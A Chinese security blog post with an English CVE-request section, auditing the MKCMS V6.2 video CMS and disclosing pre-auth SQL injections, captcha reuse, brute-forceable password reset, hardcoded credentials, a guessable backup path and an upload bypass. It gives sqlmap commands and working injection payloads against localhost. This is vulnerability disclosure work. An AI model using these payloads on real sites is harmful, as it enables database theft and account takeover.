            <p>原文首发于先知社区<a href="https://xz.aliyun.com/t/7580" target="_blank" rel="noopener">MKCMS 代码审计小结 - 先知社区</a></p>
<blockquote>
<p>MKCMS V6.2    (以下源码来自网络)<br>MKCMS 米酷影视源码 6.2 开源 CMS<br>下载地址链接：<a href="https://pan.baidu.com/s/1cZX5x9SbcXMCMXismfH4ow" target="_blank" rel="noopener">https://pan.baidu.com/s/1cZX5x9SbcXMCMXismfH4ow</a>   提取码：k3ox<br>备用下载地址：<a href="https://www.lanzous.com/ib7zwmh" target="_blank" rel="noopener">https://www.lanzous.com/ib7zwmh</a></p>
</blockquote>
<h1 id="0x00-全局过滤分析"><a href="#0x00-全局过滤分析" class="headerlink" title="0x00 全局过滤分析"></a>0x00 全局过滤分析</h1><p><code>/system/library.php:</code>使用<code>addslashes</code>转义入参, 注意到<code>$_SERVER</code>未被过滤</p>
<p>#</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586576535561-9161a459-66b4-4503-b922-836306186781.png#align=left&display=inline&height=325&margin=%5Bobject%20Object%5D&name=image.png&originHeight=650&originWidth=1320&size=214227&status=done&style=none&width=660" alt="image.png"></p>
<h1 id="0x01-验证码重用"><a href="#0x01-验证码重用" class="headerlink" title="0x01 验证码重用"></a>0x01 验证码重用</h1><p><code>/admin/cms_login.php</code>验证码处的逻辑如下，比较 session 中的验证码和输入的是否一致，不一致就进入<code>alert_href</code>，这个<code>js</code>跳转，实际是在刷新页面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/admin/cms_login.php:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="number">6</span>   ...</span><br><span class="line"> <span class="number">7</span>  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line"> <span class="number">8</span>:     <span class="keyword">if</span> ($_SESSION[<span class="string">'verifycode'</span>] != $_POST[<span class="string">'verifycode'</span>]) &#123;</span><br><span class="line"> <span class="number">9</span>  		alert_href(<span class="string">'验证码错误'</span>,<span class="string">'cms_login.php'</span>);</span><br><span class="line"><span class="number">10</span>  	&#125;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586527513750-5968d776-6be5-4cab-bdec-e2f61f12998c.png#align=left&display=inline&height=107&margin=%5Bobject%20Object%5D&name=image.png&originHeight=214&originWidth=1004&size=34379&status=done&style=none&width=502" alt="image.png"><br>跳转后就会刷新验证码，然而我用的是 burp，默认是不解析 js 的</p>
<p>全局搜索这个<code>$_SESSION[&#39;verifycode&#39;]</code>，发现只在<code>/system/verifycode.php</code>有赋值，也就是说，如果使用验证码后，我们不跟随<code>js</code>跳转，就不会重置验证码，<strong>验证码也就能被重复使用</strong>了<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586526980113-b6ec9c98-72ea-4dac-926d-b2eef01f0227.png#align=left&display=inline&height=369&margin=%5Bobject%20Object%5D&name=image.png&originHeight=737&originWidth=1060&size=124791&status=done&style=none&width=530" alt="image.png"><br>使用 burp 重放，的确如此，验证码形同虚设</p>
<h1 id="0x02-前台注入-1：-ucenter-repass-php"><a href="#0x02-前台注入-1：-ucenter-repass-php" class="headerlink" title="0x02 前台注入 1：/ucenter/repass.php"></a>0x02 前台注入 1：<code>/ucenter/repass.php</code></h1><p>看了下历史的漏洞，在<code>/ucenter/repass.php</code>有个越权修改密码的洞（<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11332" target="_blank" rel="noopener">CVE-2019-11332</a>），跟进去发现原来还有注入，以下是分析过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ucenter/repass.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">$username = stripslashes(trim($_POST[<span class="string">'name'</span>]));</span><br><span class="line">$email = trim($_POST[<span class="string">'email'</span>]);</span><br><span class="line"><span class="comment">// 检测用户名是否存在</span></span><br><span class="line">$query = mysql_query(<span class="string">"select u_id from mkcms_user where u_name='$username' and u_email='$email'"</span>);</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>前面说到全局对<code>$_POST</code>存在<code>addslash</code>的过滤（加<code>\</code>转义），上面又把参数给<code>stripslashes</code>了(去掉<code>\</code>），这不就是个注入？<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586529907632-efc6c088-ccac-49d1-9a5e-192abfb8293d.png#align=left&display=inline&height=334&margin=%5Bobject%20Object%5D&name=image.png&originHeight=668&originWidth=1917&size=144360&status=done&style=none&width=958.5" alt="image.png"><br>后来复盘，实际上，这个问题<code>coolcat</code>师傅早在去年就在先知上提出来了：<a href="https://xz.aliyun.com/t/4189#toc-1" target="_blank" rel="noopener">某 KCMS5.0 代码审计 (前台注入&amp;任意用户密码重置)，</a>师傅 nb！</p>
<h1 id="0x03-前台注入-2：-ucenter-active-php"><a href="#0x03-前台注入-2：-ucenter-active-php" class="headerlink" title="0x03 前台注入 2：/ucenter/active.php"></a>0x03 前台注入 2：/ucenter/active.php</h1><p><code>/ucenter/active.php?verify=1</code>存在注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ucenter/active.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">$verify = stripslashes(trim($_GET[<span class="string">'verify'</span>]));	<span class="comment">//去掉了转义用的\</span></span><br><span class="line">$nowtime = time();</span><br><span class="line">$query = mysql_query(<span class="string">"select u_id from mkcms_user where u_question='$verify'"</span>);</span><br><span class="line">$row = mysql_fetch_array($query);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>sqlmap 直接跑即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[INFO] GET parameter <span class="string">'verify'</span> appears to be <span class="string">'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'</span> injectable</span><br><span class="line">[INFO] GET parameter <span class="string">'verify'</span> is <span class="string">'Generic UNION query (NULL) - 1 to 20 columns'</span> injectable</span><br></pre></td></tr></table></figure>

<h1 id="0x04-前台注入-3：-ucenter-reg-php"><a href="#0x04-前台注入-3：-ucenter-reg-php" class="headerlink" title="0x04 前台注入 3：/ucenter/reg.php"></a>0x04 前台注入 3：/ucenter/reg.php</h1><p><code>/ucenter/reg.php</code>的<code>name</code>参数，存在注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ucenter/reg.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">$username = stripslashes(trim($_POST[<span class="string">'name'</span>]));</span><br><span class="line"><span class="comment">// 检测用户名是否存在</span></span><br><span class="line">$query = mysql_query(<span class="string">"select u_id from mkcms_user where u_name='$username'"</span>);</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<h1 id="0x05-任意用户密码找回（密码可被穷举）"><a href="#0x05-任意用户密码找回（密码可被穷举）" class="headerlink" title="0x05 任意用户密码找回（密码可被穷举）"></a>0x05 任意用户密码找回（密码可被穷举）</h1><p>任意用户密码找回<br>这个问题主要是<code>/ucenter/repass.php</code>代码里，找回密码的逻辑有问题，第 10 行查询到<code>username</code>、 <code>email</code>能对应上之后，14 行就直接重置密码了。。。而且密码的范围在 12 行有写，只有 90000 种可能，重置之后，burp 跑一下不就 ok 了？（当然要结合验证码重用才能有效爆破）<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586531781382-73625b5c-3937-4196-bbc2-6cf8f6502f37.png#align=left&display=inline&height=447&margin=%5Bobject%20Object%5D&name=image.png&originHeight=894&originWidth=1496&size=302207&status=done&style=none&width=748" alt="image.png"></p>
<h1 id="0x06-备份文件路径可猜解"><a href="#0x06-备份文件路径可猜解" class="headerlink" title="0x06 备份文件路径可猜解"></a>0x06 备份文件路径可猜解</h1><p>这个备份功能也太顶了，而且还是那么简单的文件名<br><code>/backupdata/movie.sql</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/admin/cms_backup.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=<span class="string">"../backupdata/"</span>.DATA_NAME.<span class="string">".sql"</span>; <span class="comment">//存放路径，默认存放到项目最外层</span></span><br><span class="line">$fp = fopen($filename,<span class="string">'w'</span>);</span><br><span class="line">fputs($fp,$mysql);</span><br><span class="line">fclose($fp);</span><br><span class="line">alert_href(<span class="string">'备份成功!'</span>,<span class="string">'cms_data.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>全局搜<code>DATA_NAME</code>变量，是安装时候设置的数据库名<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586532921372-d8f79355-fc36-4612-8234-3a24d17571ba.png#align=left&display=inline&height=118&margin=%5Bobject%20Object%5D&name=image.png&originHeight=236&originWidth=1235&size=43156&status=done&style=none&width=617.5" alt="image.png"></p>
<p>默认的<code>DATA_NAME</code>值是<code>movie</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586533096304-2b6954a4-c78e-43ed-a0a0-39d0b69ec5c7.png#align=left&display=inline&height=108&margin=%5Bobject%20Object%5D&name=image.png&originHeight=216&originWidth=711&size=31578&status=done&style=none&width=355.5" alt="image.png"></p>
<h1 id="0x07-前台文件上传"><a href="#0x07-前台文件上传" class="headerlink" title="0x07 前台文件上传"></a>0x07 前台文件上传</h1><p><code>/editor/php/upload_json.php?dir=file</code><br>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ext_arr = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'image'</span> =&gt; <span class="keyword">array</span>(<span class="string">'gif'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'png'</span>, <span class="string">'bmp'</span>),</span><br><span class="line">	<span class="string">'flash'</span> =&gt; <span class="keyword">array</span>(<span class="string">'swf'</span>, <span class="string">'flv'</span>),</span><br><span class="line">	<span class="string">'media'</span> =&gt; <span class="keyword">array</span>(<span class="string">'swf'</span>, <span class="string">'flv'</span>, <span class="string">'mp3'</span>, <span class="string">'wav'</span>, <span class="string">'wma'</span>, <span class="string">'wmv'</span>, <span class="string">'mid'</span>, <span class="string">'avi'</span>, <span class="string">'mpg'</span>, <span class="string">'asf'</span>, <span class="string">'rm'</span>, <span class="string">'rmvb'</span>),</span><br><span class="line">	<span class="string">'file'</span> =&gt; <span class="keyword">array</span>(<span class="string">'doc'</span>, <span class="string">'docx'</span>, <span class="string">'xls'</span>, <span class="string">'xlsx'</span>, <span class="string">'ppt'</span>, <span class="string">'htm'</span>, <span class="string">'html'</span>, <span class="string">'txt'</span>, <span class="string">'zip'</span>, <span class="string">'rar'</span>, <span class="string">'gz'</span>, <span class="string">'bz2'</span> ,<span class="string">'7z'</span>),</span><br><span class="line">);</span><br><span class="line">...</span><br><span class="line">$file_name = $_FILES[<span class="string">'imgFile'</span>][<span class="string">'name'</span>];</span><br><span class="line">...</span><br><span class="line"><span class="comment">//获得文件扩展名</span></span><br><span class="line">	$temp_arr = explode(<span class="string">"."</span>, $file_name);</span><br><span class="line">	$file_ext = array_pop($temp_arr);</span><br><span class="line">	$file_ext = trim($file_ext); <span class="comment">/*将file_ext转换为字符串。。。无弱类型问题了**/</span></span><br><span class="line">	$file_ext = strtolower($file_ext);  <span class="comment">//将file_ext转换为字符串。。。无弱类型问题了</span></span><br><span class="line">	<span class="comment">//检查扩展名，是否在大的数组中，in_array存在若类型问题</span></span><br><span class="line">	<span class="keyword">if</span> (in_array($file_ext, $ext_arr[$dir_name]) === <span class="keyword">false</span>) &#123;</span><br><span class="line">		alert(<span class="string">"上传文件扩展名是不允许的扩展名。\n只允许"</span> . implode(<span class="string">","</span>, $ext_arr[$dir_name]) . <span class="string">"格式。"</span>);</span><br><span class="line">	&#125;result</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>可以上传列表里的文件，只是无法拿 shell</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/editor/php/upload_json.php?dir=file</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">Content-Length</span>: 306</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryni3BwmVzIUwKfSSC</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryni3BwmVzIUwKfSSC</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="imgFile"; filename="1.jpg.html"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="attribute">11111111</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundaryni3BwmVzIUwKfSSC</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="upload"</span><br><span class="line"></span><br><span class="line"><span class="attribute">Send</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundaryni3BwmVzIUwKfSSC--</span></span><br></pre></td></tr></table></figure>

<p>出现上传链接</p>
<h1 id="0x08-凭据硬编码"><a href="#0x08-凭据硬编码" class="headerlink" title="0x08 凭据硬编码"></a>0x08 凭据硬编码</h1><p><code>/ucenter/yanzhengma.php</code>, 把密码硬编码在里面了，经过测试，可登录（<del>狗头保命</del><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586684264225-6679e12b-ad44-4554-9c50-fffeb4a39bcd.png#align=left&display=inline&height=166&margin=%5Bobject%20Object%5D&name=image.png&originHeight=332&originWidth=1277&size=86137&status=done&style=none&width=638.5" alt="image.png"></p>
<h1 id="0x09-越权"><a href="#0x09-越权" class="headerlink" title="0x09 越权"></a>0x09 越权</h1><p><code>/ucenter/mingxi.php</code><br>会员卡信息仅由用户传入的参数确定，一定存在越权漏洞</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586685476288-83c13069-03f6-4f34-8897-0f0830027cee.png#align=left&display=inline&height=252&margin=%5Bobject%20Object%5D&name=image.png&originHeight=504&originWidth=1232&size=117091&status=done&style=none&width=616" alt="image.png"></p>
<hr>
<h1 id="CVE-Request-English-Version"><a href="#CVE-Request-English-Version" class="headerlink" title="CVE Request : English Version"></a>CVE Request : English Version</h1><blockquote>
<p>Source code can be downloaded  at  <a href="https://www.lanzous.com/ib7zwmh" target="_blank" rel="noopener">https://www.lanzous.com/ib7zwmh</a></p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586581112081-f4a882d1-ad62-40f9-9a0c-d9188bad1a68.png#align=left&display=inline&height=897&margin=%5Bobject%20Object%5D&name=%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20200411125718.png&originHeight=897&originWidth=1911&size=139025&status=done&style=none&width=1911" alt="深度截图_选择区域_20200411125718.png"></p>
<h1 id="0x00-Lead-In"><a href="#0x00-Lead-In" class="headerlink" title="0x00:Lead In"></a>0x00:Lead In</h1><p>This CMS is kinda funny, coz there is a universal filter <code>addslashes</code>  in <code>/system/library.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/system/library.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (!get_magic_quotes_gpc()) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET)) &#123;</span><br><span class="line">		$_GET = addslashes_deep($_GET);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">		$_POST = addslashes_deep($_POST);</span><br><span class="line">	&#125;</span><br><span class="line">	$_COOKIE = addslashes_deep($_COOKIE);</span><br><span class="line">	$_REQUEST = addslashes_deep($_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_deep</span><span class="params">($_var_0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($_var_0)) &#123;</span><br><span class="line">		<span class="keyword">return</span> $_var_0;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> is_array($_var_0) ? array_map(<span class="string">'addslashes_deep'</span>, $_var_0) : addslashes($_var_0);</span><br><span class="line">	&#125;_var_0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>While it uses <code>stripslashes</code> somewhere by mistake, let’s do a global search about it, we get** 3 SQL injections **</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586576676672-8bef147b-e4c1-4e41-951b-38e9cc20e422.png#align=left&display=inline&height=438&margin=%5Bobject%20Object%5D&name=image.png&originHeight=876&originWidth=1189&size=159520&status=done&style=none&width=594.5" alt="image.png"></p>
<h1 id="0x01-PreAuth-SQL-injection-in-ucenter-repass-php"><a href="#0x01-PreAuth-SQL-injection-in-ucenter-repass-php" class="headerlink" title="0x01:PreAuth SQL injection in /ucenter/repass.php"></a>0x01:PreAuth SQL injection in /ucenter/repass.php</h1><p>MKCMS V6.2 has SQL injection via the /ucenter/repass.php <em>name</em> parameter.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ucenter/repass.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">$username = stripslashes(trim($_POST[<span class="string">'name'</span>]));</span><br><span class="line">$email = trim($_POST[<span class="string">'email'</span>]);</span><br><span class="line"><span class="comment">// 检测用户名是否存在</span></span><br><span class="line">$query = mysql_query(<span class="string">"select u_id from mkcms_user where u_name='$username' and u_email='$email'"</span>);</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>and it can be automated exploited by sqlmap namely</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="comment">//localhost/ucenter/repass.php  --data "name=1&amp;email=1@1.com" -p name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parameter: name (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> time-based blind (query SLEEP)</span><br><span class="line">    Payload: name=<span class="number">11</span><span class="string">' AND (SELECT 7672 FROM (SELECT(SLEEP(5)))NmRk) AND '</span>VTKx<span class="string">'='</span>VTKx&amp;email=<span class="number">222</span>@<span class="number">222.</span>m&amp;submit=</span><br></pre></td></tr></table></figure>

<p>And this can be tracked in 2019 via <a href="https://xz.aliyun.com/t/4189#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/4189#toc-1  </a>by <a href="https://xz.aliyun.com/u/12470" target="_blank" rel="noopener">CoolCat</a>, so CVE request of this vuln won’t belong to me, I just wanna enrich the CVE database.</p>
<h1 id="0x02-PreAuth-SQL-injection-in-ucenter-active-php"><a href="#0x02-PreAuth-SQL-injection-in-ucenter-active-php" class="headerlink" title="0x02:PreAuth SQL injection in /ucenter/active.php"></a>0x02:PreAuth SQL injection in /ucenter/active.php</h1><p>MKCMS V6.2 has SQL injection via the /ucenter/active.php <em>verify</em> parameter.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ucenter/active.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">$verify = stripslashes(trim($_GET[<span class="string">'verify'</span>]));	<span class="comment">//去掉了转义用的\</span></span><br><span class="line">$nowtime = time();</span><br><span class="line">$query = mysql_query(<span class="string">"select u_id from mkcms_user where u_question='$verify'"</span>);</span><br><span class="line">$row = mysql_fetch_array($query);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Likewise, attackers can exploit it via sqlmap by typing</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/ucenter/active.php?verify=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parameter: verify (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: verify=1' AND (SELECT 5656 FROM (SELECT(SLEEP(5)))xcPF) AND 'TRJq'='TRJq</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 1 column</span><br><span class="line">    Payload: verify=1' UNION ALL SELECT CONCAT(0x7171786b71,0x706d4e457048744251624653456d554a685a77654c66497a736d704c7454586462716f457a56587a,0x71707a7671)-- WUGv</span><br></pre></td></tr></table></figure>

<h1 id="0x03-PreAuth-SQL-injection-in-ucenter-reg-php"><a href="#0x03-PreAuth-SQL-injection-in-ucenter-reg-php" class="headerlink" title="0x03:PreAuth SQL injection in /ucenter/reg.php"></a>0x03:PreAuth SQL injection in /ucenter/reg.php</h1><p>MKCMS V6.2 has SQL injection via the /ucenter/reg.php <em>name</em> parameter.h</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ucenter/reg.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">$username = stripslashes(trim($_POST[<span class="string">'name'</span>]));</span><br><span class="line"><span class="comment">// 检测用户名是否存在</span></span><br><span class="line">$query = mysql_query(<span class="string">"select u_id from mkcms_user where u_name='$username'"</span>);</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>Again, sqlmap can be used to automate the exploitation</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="comment">//localhost/ucenter/reg.php  --data "name=1&amp;submit=1@1.com" -p name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parameter: name (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: <span class="keyword">AND</span> boolean-based blind - WHERE <span class="keyword">or</span> HAVING clause</span><br><span class="line">    Payload: name=<span class="number">1</span><span class="string">' AND 2487=2487 AND '</span>WOhs<span class="string">'='</span>WOhs&amp;submit=<span class="number">1</span>@<span class="number">1.</span>com</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> time-based blind (query SLEEP)</span><br><span class="line">    Payload: name=<span class="number">1</span><span class="string">' AND (SELECT 6840 FROM (SELECT(SLEEP(5)))rygh) AND '</span>eoEE<span class="string">'='</span>eoEE&amp;submit=<span class="number">1</span>@<span class="number">1.</span>com</span><br></pre></td></tr></table></figure>

<h1 id="0x04-Mitigation"><a href="#0x04-Mitigation" class="headerlink" title="0x04:Mitigation"></a>0x04:Mitigation</h1><p>remove the <code>stripslashes()</code> before the POST/GET param, thus we can’t exploit it unless the coding of MYSQL is GBK/GB2312, i.e.<em>wide byte sql injection.</em><br>(In my opinion,  is there any need to escape the name? it has never been allowed at all !</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/04/05/yuque/SQLi-lab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/05/yuque/SQLi-lab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url">SQLi-lab学习笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-05T15:22:32+08:00">
                2020-04-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>bypass<br><a href="https://xz.aliyun.com/t/7767" target="_blank" rel="noopener">https://xz.aliyun.com/t/7767</a></p>
</blockquote>
